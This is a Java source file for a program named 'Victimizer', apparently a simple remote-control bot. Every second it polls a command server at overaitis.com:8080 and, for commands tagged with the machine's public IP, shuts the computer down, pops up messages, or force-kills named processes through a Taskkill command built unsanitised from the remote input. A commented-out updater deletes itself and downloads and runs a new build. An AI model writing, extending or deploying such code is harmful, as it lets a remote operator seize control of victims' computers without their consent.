package com.crashcourse.victimizer;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ProtocolException;
import java.net.URL;
import java.net.URLConnection;
import java.util.Arrays;
import java.util.Timer;
import java.util.TimerTask;

import com.crashcourse.victimizer.updater.Updater;

public class Victimizer {
	public static String version = "1.2";
	
	public static void main(String[] args) {
		try {
			/*
			Updater updater = new Updater(getVersion());
			if(updater.isUpToDate()) {
				updater.deleteSelf();
				updater.downloadLatestBuild();
				updater.runUpdated();
			}
			*/
			{
				System.out.println("System IP: " + getIP());
				start();
			}
			
			
		} catch (IOException e) {e.printStackTrace();}
		
	}
	public static void start() {
		TimerTask task = new TimerTask() {
		      @Override
		      public void run() {
		        // task to run goes here
		    	  try {
						URL yahoo = new URL("http://overaitis.com:8080/victimizer");
				        URLConnection yc = yahoo.openConnection();
				        BufferedReader in = new BufferedReader(
				                                new InputStreamReader(
				                                yc.getInputStream()));
				        String inputLine;
			
				        while ((inputLine = in.readLine()) != null) {
				        	String input = inputLine;
				        	System.out.println(input);
				        	if(input.equalsIgnoreCase("shutdown|" + getIP())) {
				        		Actions.shutdown();
				        	}
				        	else if(input.contains("message%" + getIP() + "%")) {
				        		
				        		String[] arguments = input.split("%");
				        		System.out.println(Arrays.toString(arguments));
				        		String message = arguments[2].replace("_", " ");
				        		Actions.displayMessage(message, 0);
				        		
				        	}
				        	else if(input.contains("close%" + getIP() + "%")) {
				        		
				        		String[] arguments = input.split("%");
				        		Runtime.getRuntime().exec("Taskkill /IM " + arguments[2] + " /F");
				        		
				        	}
				        in.close();
				        }
					}
					catch (ProtocolException e) {
						
					} catch (IOException e) {
						e.printStackTrace();
					}
		      }
		    };
		    Timer timer = new Timer();
		    long delay = 0;
		    long intevalPeriod = 1 * 1000; 
		    // schedules the task to be run in an interval 
		    timer.scheduleAtFixedRate(task, delay,
		                                intevalPeriod);
	}
	
	public static String getIP() throws IOException {
		URL url = new URL("http://checkip.amazonaws.com/");
		BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
		return br.readLine();
	}
	public static String getVersion() {
		return version;
	}
}
